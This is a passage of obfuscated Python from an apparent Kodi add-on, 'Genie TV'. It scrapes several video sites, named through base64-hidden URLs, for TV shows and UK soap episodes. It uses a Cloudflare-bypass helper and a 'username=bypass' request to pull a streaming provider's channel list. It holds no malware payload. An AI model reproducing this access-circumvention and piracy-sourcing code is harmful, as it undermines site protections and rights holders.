    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 53 , "" , "Getting Redemption Links" )
    if 60 - 60: Ooo00oOo00o - i1IIi . i11i1 + i11i1 * i11i1 + oO0O
    Oo0oO ( 'tvshows' , 'Media Info 3' )
 if I1111iiiII1Ii != 'Failed' :
  OOoOOooO0OoO = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( I1111iiiII1Ii )
  for I1i11i , IiI , oOoO00o , ii , OO0ooOOO0OOO in OOoOOooO0OoO :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    ooo00OOOooO ( ( '[COLORgreen]' + OO0ooOOO0OOO + '- source Reaper[/COLOR]' ) , I1i11i , 222 , IiI , ii , oOoO00o )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 61 , "" , "Getting Reaper Links" )
    if 58 - 58: oO0O % OoooooooOO
    Oo0oO ( 'tvshows' , 'Media Info 3' )
 if oO0oOoOoo0 != 'Failed' :
  IIii11i = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( oO0oOoOoo0 )
  for I1i11i , IiI , oOoO00o , ii , OO0ooOOO0OOO in IIii11i :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    ooo00OOOooO ( ( '[COLORgreen]' + OO0ooOOO0OOO + '- source Herovision[/COLOR]' ) , I1i11i , 222 , IiI , ii , oOoO00o )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 70 , "" , "Getting Herovision Links" )
    if 82 - 82: ii11ii1ii
    Oo0oO ( 'tvshows' , 'Media Info 3' )
    if 54 - 54: OOooOOo + OOoo0OO0 - iIii1I11I1II1 % oOO % iI1Ii11iII1
 if o0o000o != 'Failed' :
  II1iiI1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( o0o000o )
  for I1i11i , IiI , OO0ooOOO0OOO in II1iiI1 :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    I1111I1II11 ( ( '[COLORgreen]' + OO0ooOOO0OOO + '- source Silent Hunter[/COLOR]' ) , I1i11i , 222 , IiI )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 78 , "" , "Getting Silent Hunter Links" )
    if 4 - 4: Oo - Ooo00oOo00o - i11iIiiIii * I1I1ii / oO0O - i11i1
    Oo0oO ( 'tvshows' , 'Media Info 3' )
 II1IIii1ii = [ '480p' , '720p' , '1080p' , 'mova' , 'movb' , 'movc' , 'movd' , 'move' , 'movf' , 'movg' , 'movh' , 'movi' , 'movj' , 'movk' , 'movl' , 'movm' , 'movn' , 'movo' , 'movp' , 'movq' , 'movr' , 'movs' , 'movt' , 'movu' , 'movv' , 'movw' , 'movx' , 'movy' , 'movz' ]
 if 30 - 30: Ooo0OO0oOO * Oo / Ooo0OO0oOO . OoOoOO00 . Oo
 for Iii1Ii in II1IIii1ii :
  ii11I11i = IIiiiiiiIi1I1 + Iii1Ii + II11iiii1Ii
  ooIi111iII = i11iIIIIIi1 ( ii11I11i )
  if ooIi111iII != 'Failed' :
   Oo0OoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( ooIi111iII )
   for I1i11i , IiI , oOoO00o , ii , OO0ooOOO0OOO in Oo0OoOo :
    if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
     ooo00OOOooO ( '[COLORgreen]' + OO0ooOOO0OOO + ' - Source Pandoras[/COLOR]' , I1i11i , 222 , IiI , ii , oOoO00o )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 89 , "" , "Getting Pandoras Links" )
     if 13 - 13: OOooOOo
     Oo0oO ( 'tvshows' , 'Media Info 3' )
     if 7 - 7: OOOo0 + iI1Ii11iII1 / i11iIiiIii / Oo
 ooO = [ '0-9/' , 'A/' , 'B/' , 'C/' , 'D/' , 'E/' , 'F/' , 'G/' , 'H/' , 'I/' , 'J/' , 'K/' , 'L/' , 'M/' , 'N/' , 'O/' , 'P/' , 'R/' , 'S/' , 'T/' , 'U/' , 'V/' , 'W/' , 'X/' , 'Y/' , 'Z/' ]
 if 97 - 97: I1I1ii . OOoo0OO0 / OOOo0
 if 83 - 83: OOoo0OO0 - ii11ii1ii * Ooo0OO0oOO
 for Iii1Ii in ooO :
  ii11I11i = O0o + Iii1Ii
  oOO00OO0OooOo = iiIiII ( ii11I11i )
  if iiiI11 != 'Failed' :
   ii111iI1i1 = re . compile ( '<li><a href="(.+?)"> (.+?)</a></li>' ) . findall ( oOO00OO0OooOo )
   for O0oooo000oO0 , OO0ooOOO0OOO in ii111iI1i1 :
    if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
     IIi1I ( ( '[COLORgreen]' + OO0ooOOO0OOO + 'source 5[/COLOR]' ) . replace ( 'Ganool' , '' ) . replace ( 'ShAaNiG' , '' ) . replace ( 'YIFY' , '' ) . replace ( '[[ Max-Movie.In ]]' , '' ) . replace ( '.mkv' , '' ) . replace ( '.mp4' , '' ) . replace ( '.' , ' ' ) , ( O0o + Iii1Ii + O0oooo000oO0 ) , 222 , '' )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 100 , "" , "Getting Source 5 Links" )
     if 80 - 80: Ooo00oOo00o / iI1Ii11iII1 * OOOo0 % iI1Ii11iII1
     Oo0oO ( 'tvshows' , 'Media Info 3' )
     if 95 - 95: O0 / OOoo0OO0 . I1I1ii
     if 17 - 17: OOoo0OO0
def o0OO0OO000OO ( ) :
 if 92 - 92: OOoo0OO0 % i1IIi % oOO % iI1Ii11iII1 % OOooOOo
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 IIo0Oo0oO0oOO00 = Ooo0OOoOoO0 . lower ( )
 i1iI1Ii11Ii1 = ( i1111 ( 'aHR0cDovL2Nvb2x0dnNlcmllcy5jb20vc2VhcmNoLnBocD90YWc9' ) ) + ( Ooo0OOoOoO0 ) . replace ( ' ' , '+' )
 I1i11i = ( i1111 ( 'aHR0cDovL2RsLmZhcnNpbW92aWUubmV0L1NlcmlhbC8=' ) )
 I1III1111iIi = ( i1111 ( 'aHR0cDovL3N2Mi5kbC1wYXJzLmluLw==' ) )
 OooOo0oo0O0o00O = ( i1111 ( 'aHR0cDovL3R2LmRsLXBhcnMuaW4v' ) )
 O00Ooo0O0OOOo = ( i1111 ( 'aHR0cDovL2RsLnZpcG1heC1tb3ZpZS5pbi9BbWVyaWNhbiUyMFNlcmlhbC8=' ) )
 iIo00OOOOOo0OOo = ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29tL2Fyc2l2P2xpbWl0PSZ0dXI9Jm9yZGVyYnk9JnVsa2U9Jm9yZGVyPSZ5aWw9JmRpemlfYWRpPQ==' ) ) + ( Ooo0OOoOoO0 ) . replace ( ' ' , '+' )
 i1II11I11ii1 = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9zY29vYnkvc2hvd3MvdHZhbGwucGhw' ) )
 OOoO0oO00o = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9UaGVfUmVhcGVyL2FsbHR2LnBocA==' ) )
 OOO0OoO0oo0OO = ( i1111 ( 'aHR0cDovL2dlbmlldHZjdW50cy5jby51ay9oZXJvdmlzaW9uL3ZvZC90dmZ1bGwucGhw' ) )
 if 92 - 92: oO0O - iIii1I11I1II1
 Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Checking Sources" , '' , 'Please Wait' )
 I1111iiiII1Ii = iiIiII ( i1iI1Ii11Ii1 )
 Oo0oO0ooo . update ( 0 , "" , "Checking Source 1/9 Links" )
 oO0 = iiIiII ( I1i11i )
 Oo0oO0ooo . update ( 14 , "" , "Checking Source 2/9 Links" )
 Iiii1iI1i = iiIiII ( I1III1111iIi )
 Oo0oO0ooo . update ( 28 , "" , "Checking Source 3/9 Links" )
 ooO000OO = iiIiII ( OooOo0oo0O0o00O )
 Oo0oO0ooo . update ( 40 , "" , "Checking Source 4/9 Links" )
 i1Ii = iiIiII ( O00Ooo0O0OOOo )
 Oo0oO0ooo . update ( 52 , "" , "Checking Source 5/9 Links" )
 iiiI11 = cloudflare . source ( iIo00OOOOOo0OOo )
 Oo0oO0ooo . update ( 64 , "" , "Checking Source 6/9 Links" )
 oOO00OO0OooOo = iiIiII ( i1II11I11ii1 )
 Oo0oO0ooo . update ( 76 , "" , "Checking Source 7/9 Links" )
 o0o00OOOO = iiIiII ( OOoO0oO00o )
 Oo0oO0ooo . update ( 88 , "" , "Checking Source 8/9 Links" )
 i11iIi1iIIIIi = iiIiII ( OOO0OoO0oo0OO )
 Oo0oO0ooo . update ( 100 , "" , "Checking Source 9/9 Links" )
 if 31 - 31: II1i1IiiIIi11 - I1IiI . I1IiI - Ooo0OO0oOO + Oo / i11iIiiIii
 if i11iIi1iIIIIi != 'Failed' :
  Ii1I = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( i11iIi1iIIIIi )
  for I1i11i , IiI , oOoO00o , ii , OO0ooOOO0OOO in Ii1I :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    O00OOOoOoo0O ( ( '[COLORgreen]' + OO0ooOOO0OOO + '- source HeroVision[/COLOR]' ) , I1i11i , 1016 , IiI , ii , oOoO00o )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 10 , "" , "Getting Herovision Links" )
    if 90 - 90: iIii1I11I1II1 + I1IiI
    Oo0oO ( 'tvshows' , 'Media Info 3' )
    if 9 - 9: iIii1I11I1II1 . OoooooooOO + i1IIi - Oo
 if o0o00OOOO != 'Failed' :
  i11i = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( o0o00OOOO )
  for I1i11i , IiI , oOoO00o , ii , OO0ooOOO0OOO in i11i :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    O00OOOoOoo0O ( ( '[COLORgreen]' + OO0ooOOO0OOO + '- source Reaper[/COLOR]' ) , I1i11i , 1016 , IiI , ii , oOoO00o )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 20 , "" , "Getting Reaper Links" )
    if 30 - 30: II1i1IiiIIi11 / Ooo00oOo00o . II1i1IiiIIi11
    Oo0oO ( 'tvshows' , 'Media Info 3' )
    if 17 - 17: Oo + OoooooooOO * OoooooooOO
 if I1111iiiII1Ii != 'Failed' :
  OOoOOooO0OoO = re . compile ( 'href="([^"]*)"><img src="([^"]*)" alt="([^"]*)"' ) . findall ( I1111iiiII1Ii )
  for I1i11i , IIIIiI11I11 , OO0ooOOO0OOO in OOoOOooO0OoO :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + ' CoolSeries[/COLOR]' , I1i11i , 7052 , IIIIiI11I11 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 30 , "" , "Getting CoolSeries Links" )
    if 5 - 5: I1I1ii % OoooooooOO . I1IiI
    Oo0oO ( 'tvshows' , 'Media Info 3' )
 if oO0 != 'Failed' :
  OoOO0oo0o = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( oO0 )
  for OO0ooOOO0OOO in OoOO0oo0o :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    I1111I1II11 ( '[COLORgreen]' + ( OO0ooOOO0OOO ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) + ' source 1 [/COLOR]' , ( I1i11i + OO0ooOOO0OOO ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 40 , "" , "Getting Source 1 Links" )
    if 67 - 67: ii11ii1ii + oO0O
    Oo0oO ( 'tvshows' , 'Media Info 3' )
 if Iiii1iI1i != 'Failed' :
  II11i1I11Ii1i = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( Iiii1iI1i )
  for OO0ooOOO0OOO in II11i1I11Ii1i :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    I1111I1II11 ( ( OO0ooOOO0OOO + ' source 2' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( I1III1111iIi + OO0ooOOO0OOO ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 50 , "" , "Getting Source 2 Links" )
    if 72 - 72: iI1Ii11iII1 % OOooOOo
    Oo0oO ( 'tvshows' , 'Media Info 3' )
 if ooO000OO != 'Failed' :
  I1I1Iiii1 = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( ooO000OO )
  for OO0ooOOO0OOO in II11i1I11Ii1i :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    I1111I1II11 ( ( OO0ooOOO0OOO + ' source 3' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( OooOo0oo0O0o00O + OO0ooOOO0OOO ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 60 , "" , "Getting Source 3 Links" )
    if 93 - 93: iIii1I11I1II1 + i11iIiiIii . OOooOOo . i1IIi % OOOo0 % oOO
    Oo0oO ( 'tvshows' , 'Media Info 3' )
 if i1Ii != 'Failed' :
  oO0oo = re . compile ( '<a .*?>(.*?)</a>' ) . findall ( i1Ii )
  for OO0ooOOO0OOO in II11i1I11Ii1i :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    I1111I1II11 ( ( OO0ooOOO0OOO + ' source 4' ) . replace ( '..&gt;' , '' ) . replace ( '/' , '' ) , ( O00Ooo0O0OOOo + OO0ooOOO0OOO ) . replace ( ' ' , '%20' ) , 1006 , '' )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 70 , "" , "Getting Source 4 Links" )
    if 52 - 52: iI1Ii11iII1 % oOO
    Oo0oO ( 'tvshows' , 'Media Info 3' )
 if iiiI11 != 'Failed' :
  I111Iii1 = re . compile ( '<a href="(.+?)" class="film-image">\n<img src="(.+?)" alt=""/>\n</a>\n<div class="tss-detail">\n<a class="title" style="" href=".+?">\n<span class="position">.+?</span>\n(.+?)</a>' ) . findall ( iiiI11 )
  for I1i11i , IIIIiI11I11 , OO0ooOOO0OOO in I111Iii1 :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + ' - Source - Dizi[/COLOR]' , I1i11i , 8062 , IIIIiI11I11 )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 80 , "" , "Getting Dizi Links" )
    if 25 - 25: OOoo0OO0 / OOoo0OO0 % OoooooooOO - ii11ii1ii * Ooo0OO0oOO
    Oo0oO ( 'tvshows' , 'Media Info 3' )
 if oOO00OO0OooOo != 'Failed' :
  ii111iI1i1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( oOO00OO0OooOo )
  for I1i11i , IiI , oOoO00o , ii , OO0ooOOO0OOO in ii111iI1i1 :
   if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
    O00OOOoOoo0O ( ( '[COLORgreen]' + OO0ooOOO0OOO + '- Source Scooby[/COLOR]' ) , I1i11i , 1016 , IiI , ii , oOoO00o )
    Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
    Oo0oO0ooo . update ( 90 , "" , "Getting Scooby Links" )
    if 23 - 23: i11iIiiIii
    Oo0oO ( 'tvshows' , 'Media Info 3' )
    if 100 - 100: Ooo0OO0oOO + O0 . OOOo0 + i1IIi - I1IiI + OOooOOo
 ooOOo = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' , 'g' , 'h' , 'i' , 'j' , 'k' , 'l' , 'm' , 'n' , 'o' , 'p' , 'q' , 'r' , 's' , 't' , 'u' , 'v' , 'w' , 'x' , 'y' , 'z' ]
 if 5 - 5: O0
 for Iii1Ii in ooOOo :
  ii11I11i = IIiiiiiiIi1I1 + Iii1Ii + II11iiii1Ii
  oO0oOoOoo0 = i11iIIIIIi1 ( ii11I11i )
  if oO0oOoOoo0 != 'Failed' :
   IIii11i = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( oO0oOoOoo0 )
   for OO0ooOOO0OOO , oOoO00o , I1i11i , IIIIiI11I11 , iI1ii1i , OOoOoo00Oo in IIii11i :
    if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
     O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + ' - Source Pandoras[/COLOR]' , I1i11i , OOoOoo00Oo , IIIIiI11I11 , iI1ii1i , oOoO00o )
     Oo0oO0ooo . create ( "[COLORgreen]Genie TV[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
     Oo0oO0ooo . update ( 100 , "" , "Getting Pandoras Links" )
     if 75 - 75: I1I1ii + iIii1I11I1II1
     Oo0oO ( 'tvshows' , 'Media Info 3' )
     if 19 - 19: OOOo0 + i11iIiiIii . iI1Ii11iII1 - OOoo0OO0 / oO0O + OOooOOo
     if 38 - 38: Oo / iIii1I11I1II1 * iIii1I11I1II1 % ii11ii1ii
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
def O00oo0o0ooOo00 ( ) :
 if 91 - 91: Ooo00oOo00o * I1I1ii % Ooo00oOo00o . OOooOOo * ii11ii1ii . i11i1
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 IIo0Oo0oO0oOO00 = Ooo0OOoOoO0 . lower ( )
 I1i11i = ( i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYvRGVzaVN0cmVhbXMvaW5kZXgyMDIucGhwP3RhZz1nZXRfYWxsX2NoYW5uZWwmdXNlcm5hbWU9YnlwYXNz' ) )
 oO0 = i11iIIIIIi1 ( I1i11i )
 OoOO0oo0o = re . compile ( '"id":".+?","name":"(.+?)","img":"(.+?)","stream_url3":".+?","cat_id":"(.+?)","stream_url2":".+?","stream_url":".+?"}' , re . DOTALL ) . findall ( oO0 )
 for OO0ooOOO0OOO , IIIIiI11I11 , i111I111 in OoOO0oo0o :
  I1Iiii = i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYv' ) + ( IIIIiI11I11 ) . replace ( '\\' , '' )
  if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
   I1111I1II11 ( OO0ooOOO0OOO , '' , 7022 , I1Iiii )
   if 22 - 22: oO0O * OOoo0OO0 + OOOo0 - OOoo0OO0 / ii11ii1ii
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
iii1 = '{ZH},' ; oOo0OoOOOo0 = '{IX},' ; OOoo00 = '{LM},'
if 22 - 22: oOO / oOO - oO0O % OOoo0OO0 . i11i1 + iI1Ii11iII1
def OooO00oo0O0 ( url ) :
 i1iI = cloudflare . source ( url )
 OoOO0oo0o = re . compile ( '<a class="season" href="(.+?)">\n(.+?)\n</a>\n</span>\n<span>\n<a class="episode" href=".+?">\n(.+?)\n</a>\n</span>\n<span>\n<a class="episode-name" href=".+?">\n(.+?)</a>' ) . findall ( i1iI )
 for url , I1ii1 , oO00oooOOoOo0 , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( ( I1ii1 ) . replace ( 'Sezon' , ' Season ' ) + ( oO00oooOOoOo0 ) . replace ( 'Bölüm' , ' Episode ' ) + OO0ooOOO0OOO , url , 8063 , '' )
  if 73 - 73: OoooooooOO . Oo / O0 - O0
  if 25 - 25: iIii1I11I1II1 * OOoo0OO0 - Ooo0OO0oOO % i11iIiiIii + oO0O % Ooo0OO0oOO
  if 5 - 5: iIii1I11I1II1 . Ooo0OO0oOO
  if 2 - 2: iIii1I11I1II1 * OOOo0 % i1IIi % ii11ii1ii + OoooooooOO + OOOo0
def iIi1iiI1i1 ( url ) :
 i1iI = cloudflare . source ( url )
 OoOO0oo0o = re . compile ( 'file: "(.+?)",.+?label: "(.+?)",' , re . DOTALL ) . findall ( i1iI )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  IIi1I ( OO0ooOOO0OOO , url , 222 , '' )
  if 3 - 3: i11i1 . iI1Ii11iII1 / Oo
  if 89 - 89: OoooooooOO . iIii1I11I1II1 . Oo * iIii1I11I1II1 - I1I1ii
  if 92 - 92: OoooooooOO - ii11ii1ii - OoooooooOO % OOOo0 % OOOo0 % iIii1I11I1II1
  if 92 - 92: II1i1IiiIIi11 * O0 % I1I1ii . iIii1I11I1II1
def o00OoO ( ) :
 if 96 - 96: oOO . OoooooooOO
 i1iI = cloudflare . source ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29t' ) )
 OoOO0oo0o = re . compile ( '<li id=".+?">.+?<a href="(.+?)">.+?<img width="40" height="40" src="(.+?)" alt=""/>.+?<span class="title">\n(.+?)</span>.+?<span class="alt-title">\n(.+?)</span>.+?</a>.+?</li>' , re . DOTALL ) . findall ( i1iI )
 for I1i11i , IIIIiI11I11 , OO0ooOOO0OOO , oO00oooOOoOo0 in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO + '  -  ' + ( oO00oooOOoOo0 ) . replace ( 'sezon' , 'Season' ) . replace ( 'bölüm' , 'Episode' ) , I1i11i , 8063 , IIIIiI11I11 )
  if 39 - 39: i11i1 + Ooo00oOo00o
def oOoOOOO0OOO ( ) :
 IIIII1II = iI1 ( i1111 ( 'aHR0cDovL3d3dy50dmd1aWRlLmNvLnVrLw==' ) )
 OoOO0oo0o = re . compile ( '<a href="(.+?)"  qt-title=".+?" qt-text=".+?<br> .+?" title="(.+?)".+?class=".+? src="(.+?)" alt=".+?" /></a>' , re . DOTALL ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO , IIIIiI11I11 in OoOO0oo0o :
  IIi1I ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , I1i11i , 8002 , IIIIiI11I11 )
def O0oo0oO00o ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<table border="0".+?url((.+?));background-repeat: no-repeat;">.+?<tr>.+?<span class="season">(.+?)</span><br>.+?<a href="(.+?)"+?>(.+?)</span><br>.+?<span class="programmetext">(.+?)</span></a><br>' , re . DOTALL ) . findall ( IIIII1II )
 for IIIIiI11I11 , time , url , OO0ooOOO0OOO , IiiIIIiI1ii in OoOO0oo0o :
  O00OOOoOoo0O ( '%s %s' % ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , time ) , url , 1015 , IIIIiI11I11 , IiiIIIiI1ii )
  if 35 - 35: II1i1IiiIIi11 * iIii1I11I1II1 / oOO * i1IIi * O0 % iIii1I11I1II1
def Oo0O0O ( ) :
 if 8 - 8: i11iIiiIii * O0 + ii11ii1ii . iIii1I11I1II1 % OOoo0OO0 / OOoo0OO0
 I1111I1II11 ( 'Coronation Street' , '' , 8001 , '' )
 I1111I1II11 ( 'Eastenders' , '' , 8002 , '' )
 I1111I1II11 ( 'Emmerdale' , '' , 8003 , '' )
 I1111I1II11 ( 'Hollyoaks' , '' , 8004 , '' )
 I1111I1II11 ( 'Im a Celebrity' , '' , 8005 , '' )
 if 70 - 70: OOOo0 + oO0O
 if 70 - 70: iI1Ii11iII1 . i11iIiiIii
 if 76 - 76: II1i1IiiIIi11 . iI1Ii11iII1 % II1i1IiiIIi11 - I1I1ii
 if 51 - 51: OoooooooOO + OOooOOo * iIii1I11I1II1 * Ooo0OO0oOO / i1IIi
def I11IiI1i ( ) :
 oO0 = i11iIIIIIi1 ( 'http://uksoapshare.blogspot.co.uk/' )
 OoOO0oo0o = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( oO0 )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  if 'Holly' in OO0ooOOO0OOO :
   IIIIiI11I11 = 'http://2.bp.blogspot.com/-9c7Sieh1RKs/UjD6TGAEEnI/AAAAAAAAAC8/84uwHfxcuYg/s1600/Hollyoaks.png'
   if 'huge' in I1i11i :
    IIi1I ( ( OO0ooOOO0OOO ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , I1i11i . replace ( '\\/' , '/' ) , 8006 , IIIIiI11I11 )
   else :
    pass
    if 81 - 81: iIii1I11I1II1 / Ooo0OO0oOO . i11iIiiIii * OoOoOO00
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE_IGNORE_THE ) ;
 if 55 - 55: ii11ii1ii
def oOoo0OO0 ( ) :
 oO0 = i11iIIIIIi1 ( 'http://uksoapshare.blogspot.co.uk/' )
 OoOO0oo0o = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( oO0 )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  if 'East' in OO0ooOOO0OOO :
   IIIIiI11I11 = 'http://3.bp.blogspot.com/-KWHcNbNJU8Y/Vi1ousRl7fI/AAAAAAAAAT8/ksNE12LH0nE/s1600/eastenders.jpg'
   if 'huge' in I1i11i :
    IIi1I ( ( OO0ooOOO0OOO ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , I1i11i . replace ( '\\/' , '/' ) , 8006 , IIIIiI11I11 )
   else :
    pass
    if 5 - 5: i11iIiiIii * Oo
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 29 - 29: oO0O / oOO % OOoo0OO0
def ii1iIII1ii ( ) :
 oO0 = i11iIIIIIi1 ( 'http://uksoapshare.blogspot.co.uk/' )
 OoOO0oo0o = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( oO0 )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  if 'Emmer' in OO0ooOOO0OOO :
   IIIIiI11I11 = 'http://2.bp.blogspot.com/-UfDcxisVV5c/UjH9vUicZ3I/AAAAAAAAADc/8Ozuiz1ojxw/s1600/Emmerdale.jpg'
   if 'huge' in I1i11i :
    IIi1I ( ( OO0ooOOO0OOO ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , I1i11i . replace ( '\\/' , '/' ) , 8006 , IIIIiI11I11 )
   else :
    pass
    if 47 - 47: OOoo0OO0 . II1i1IiiIIi11 * oO0O - oOO . OOoo0OO0 - i11i1
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 94 - 94: OOOo0 % iI1Ii11iII1 + Ooo00oOo00o
def OoOooO ( ) :
 oO0 = i11iIIIIIi1 ( 'http://uksoapshare.blogspot.co.uk/' )
 OoOO0oo0o = re . compile ( '<a href="(.+?)".+?target=_blank>(.+?)</a>' ) . findall ( oO0 )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  if 'Coro' in OO0ooOOO0OOO :
